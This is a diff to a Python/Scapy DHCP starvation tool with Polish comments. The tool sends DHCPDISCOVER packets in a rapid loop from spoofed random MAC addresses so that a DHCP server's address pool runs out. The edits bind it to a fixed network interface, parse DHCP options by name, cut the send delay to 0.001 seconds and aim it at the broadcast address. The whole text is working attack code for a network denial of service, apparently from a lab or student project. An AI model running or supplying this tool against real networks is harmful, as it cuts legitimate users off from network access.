@@ -36,12 +36,12 @@ class DHCPStarvation:
         while True: self.starve()
 
     # Nasłuchiwanie pakietów UDP na portach 67 i 68 - Przekazanie pasujących pakietów do metody handleDHCP
-    def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0)
+    def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0, iface="enp3s0")
 
     # Wysłanie odpowiedzi na DHCPOffer - DHCPRequest z otrzymanymi parametrami konfiguracyjnymi 
     def DHCPRequest(self, client_mac, server_mac, server_ip, given_ip):
         # Definicja pakietu sieciowego do wysłania
-        req = Ether(src=client_mac, dst=server_mac)
+        req = Ether(src=client_mac, dst="FF:FF:FF:FF:FF:FF")
         req /= IP(src="0.0.0.0", dst=server_ip)
         req /= UDP(sport=68, dport=67)
         req /= BOOTP(chaddr=client_mac)
@@ -51,24 +51,30 @@ class DHCPStarvation:
             ("server_id", server_ip),
             "end"])
         
-        sendp(req, verbose=0)
+        sendp(req, verbose=0, iface="enp3s0")
         self.log(f"Wysłano z\t{client_mac} do ({server_ip} {server_mac}) DHCPREQUEST na {given_ip}")
+
+    def getDHCPOption(self, packet, option:str):
+        for i in packet[DHCP].options:
+            if i[0] == option: return i[1]
 
     # Obsługa otrzymanych pakietów DHCP
     def handleDHCP(self, pkt):
         if pkt[DHCP]:
+            msgtype = self.getDHCPOption(pkt, "message-type")
             # Jeżeli otrzymamy pakiet DHCPOFFER
-            match pkt[DHCP].options[1][1]:
+
+            match msgtype:
                 case 2:
                     # Pobranie parametrów z pakietu
                     given_ip = pkt.getlayer(BOOTP).yiaddr
-                    given_subnet_mask = pkt[DHCP].options[2][1]
-                    given_dns = pkt[DHCP].options[4][1]
-                    server_ip = pkt[DHCP].options[0][1]
+                    given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
+                    given_dns = self.getDHCPOption(pkt, "name_server")
+                    server_ip = self.getDHCPOption(pkt, "server_id")
                     server_mac = pkt[Ether].src
                     client_mac_b = pkt[BOOTP].chaddr
                     client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
-                    gateway = pkt[DHCP].options[3][1]
+                    gateway = self.getDHCPOption(pkt, "router")
 
                     self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPOFFER ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
 
@@ -78,19 +84,19 @@ class DHCPStarvation:
                 case 5:
                     # Pobranie parametrów z pakietu
                     given_ip = pkt.getlayer(BOOTP).yiaddr
-                    given_subnet_mask = pkt[DHCP].options[2][1]
-                    given_dns = pkt[DHCP].options[4][1]
-                    server_ip = pkt[DHCP].options[0][1]
+                    given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
+                    given_dns = self.getDHCPOption(pkt, "name_server")
+                    server_ip = self.getDHCPOption(pkt, "server_id")
                     server_mac = pkt[Ether].src
                     client_mac_b = pkt[BOOTP].chaddr
                     client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
-                    gateway = pkt[DHCP].options[3][1]
+                    gateway = self.getDHCPOption(pkt, "router")
 
                     self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPACK ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
                 
                 # Jeżeli otrzymamy pakiet DHCPNAK
                 case 6:
-                    server_ip = pkt[DHCP].options[0][1]
+                    server_ip = self.getDHCPOption(pkt, "server_id")
                     server_mac = pkt[Ether].src
                     client_mac_b = pkt[BOOTP].chaddr
                     client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
@@ -104,22 +110,22 @@ class DHCPStarvation:
         # Generacja adresów MAC (lub jednego adresu w przypadku wybrania takiej opcji)
         src_mac=0
         if self.singleSpoofedMAC:
-            if len(self.singlemac)==0: self.singlemac = str(RandMAC())
+            if len(self.singlemac)==0: self.singlemac = RandMAC()
             src_mac = self.singlemac
         else:
             src_mac = RandMAC()
-            while src_mac in self.macs: src_mac = str(RandMAC())
+            while src_mac in self.macs: src_mac = RandMAC()
             self.macs.append(src_mac)
 
         # Definicja pakietu sieciowego do wysłania
-        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:Ff")
+        pkt = Ether(src=mac2str(src_mac), dst="ff:ff:ff:ff:ff:ff")
         pkt /= IP(src="0.0.0.0", dst=self.targetDHCPServerIP)
         pkt /= UDP(sport=68, dport=67)
         pkt /= BOOTP(chaddr=mac2str(src_mac))
         pkt /= DHCP(options=[
             ("message-type","discover"),
             "end"])
-        sendp(pkt, verbose=0)
+        sendp(pkt, verbose=0, iface="enp3s0")
         self.log(f"Wysłano z\t{src_mac} DHCPDISCOVER")
         sleep(self.sleepTimer)
 
@@ -133,10 +139,10 @@ if __name__ == "__main__":
     # loggingEnabled        - Czy zapisywać każdy z komunikatów do pliku log.txt?
 
     singleSpoofedMAC    = False
-    customMAC           = "CB:EC:BD:CB:EC:BD"
-    finishDORA          = True
-    sleepTimer          = 0.002
-    targetDHCPServerIP  = "10.0.0.3"
+    customMAC           = "08:bc:20:66:ae:22"
+    finishDORA          = False
+    sleepTimer          = 0.001
+    targetDHCPServerIP  = "255.255.255.255"
     loggingEnabled      = True
 
     print(
